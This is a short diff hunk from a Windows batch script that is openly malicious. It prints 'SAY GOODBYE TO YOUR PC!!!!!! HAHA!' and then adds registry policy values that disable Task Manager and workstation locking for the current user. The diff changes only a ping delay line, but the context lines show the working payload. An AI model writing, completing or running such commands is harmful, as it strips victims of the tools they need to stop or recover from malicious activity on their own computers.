@@ -15,7 +15,7 @@ if not %ERRORLEVEL%==0 exit
 
 :definitelynotdeath
 echo SAY GOODBYE TO YOUR PC!!!!!! HAHA!
-ping localhost -n 5>nul
+ping localhost>nul
 reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
 REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1
 REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkStation /t REG_DWORD /d 1
